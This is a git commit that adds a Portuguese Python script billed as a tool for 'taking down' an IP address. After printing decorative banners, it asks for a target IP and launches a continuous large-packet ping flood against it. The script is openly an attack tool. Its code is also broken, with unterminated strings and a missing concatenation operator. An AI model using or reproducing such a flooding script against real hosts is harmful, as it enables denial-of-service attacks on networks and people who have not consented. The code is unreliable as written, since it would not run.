7aad1d1c6455af20e98897ef1a208959b69dc167
Wolf404 <96954406+WBs234@users.noreply.github.com>
2023-01-08 12:34:22 -0300

    Create Execute.py

---
+++ Execute.py
@@ -0,0 +1,29 @@
+import os
+import time
+branco= '\033[37m'
+azul= '\033[34m'
+vermelho= '\033[31m'
+def script():
+    os.system("clear")
+    time.sleep(1)
+    print(branco+""" ⣿⣿⣿⣵⣿⣿⣿⠿⡟⣛⣧⣿⣯⣿⣝⡻⢿⣿⣿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⣿⠋⠁⣴⣶⣿⣿⣿⣿⣿⣿⣿⣦⣍⢿⣿⣿⣿⣿⣿ ⣿⣿⣿⣿⢷⠄⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⢼⣿⣿⣿⣿ ⢹⣿⣿⢻⠎⠔⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣿⣿⣿⣿ ⢸⣿⣿⠇⡶⠄⣿⣿⠿⠟⡛⠛⠻⣿⡿⠿⠿⣿⣗⢣⣿⣿⣿⣿""")
+    print(azul+"""⠐⣿⣿⡿⣷⣾⣿⣿⣿⣾⣶⣶⣶⣿⣁⣔⣤⣀⣼⢲⣿⣿⣿⣿ ⠄⣿⣿⣿⣿⣾⣟⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⢟⣾⣿⣿⣿⣿ ⠄⣟⣿⣿⣿⡷⣿⣿⣿⣿⣿⣮⣽⠛⢻⣽⣿⡇⣾⣿⣿⣿⣿⣿ ⠄⢻⣿⣿⣿⡷⠻⢻⡻⣯⣝⢿⣟⣛⣛⣛⠝⢻⣿⣿⣿⣿⣿⣿ ⠄⠸⣿⣿⡟⣹⣦⠄⠋⠻⢿⣶⣶⣶⡾⠃⡂⢾⣿⣿⣿⣿⣿⣿""")
+    print(vermelho+"""⠄⠄⠟⠋⠄⢻⣿⣧⣲⡀⡀⠄⠉⠱⣠⣾⡇⠄⠉⠛⢿⣿⣿⣿ ⠄⠄⠄⠄⠄⠈⣿⣿⣿⣷⣿⣿⢾⣾⣿⣿⣇⠄⠄⠄⠄⠄⠉⠉ ⠄⠄⠄⠄⠄⠄⠸⣿⣿⠟⠃⠄⠄⢈⣻⣿⣿⠄⠄⠄⠄⠄⠄⠄ ⠄⠄⠄⠄⠄⠄⠄⢿⣿⣾⣷⡄⠄⢾⣿⣿⣿⡄⠄⠄⠄⠄⠄⠄ ⠄⠄⠄⠄⠄⠄⠄⠸⣿⣿⣿⠃⠄⠈⢿⣿⣿⠄⠄⠄⠄⠄⠄⠄""")
+    time.sleep(1)
+    print("\n")
+    print (branco+"""░█▀█░█░█░▀█▀░▀█▀░█▀█░░░▀█▀░█▀█ ░█▀▀░█░█░░█░░░█░░█░█░░░░█░░█▀▀ ░▀░░░▀▀▀░░▀░░▀▀▀░▀░▀░░░▀▀▀░▀░░")
+    time.sleep(1)
+    print("\n")
+    print(vermelho+"Criado por "+azul+"Wolf404")
+    time.sleep(1)
+    print(vermelho+"Bem vindo ao script de derrubar Ip!)
+    print("\n")
+    ip=input("Digite o endereço de ip que deseja atacar: "+azul)
+    time.sleep(1)
+    print(vermelho+"Para parar o ataque, aperte"azul+" ctrl+c")
+    print("Ataque iniciado...")
+    os.system("Ping -t -l 65500 "+ip)
+script()
+    
+    
+
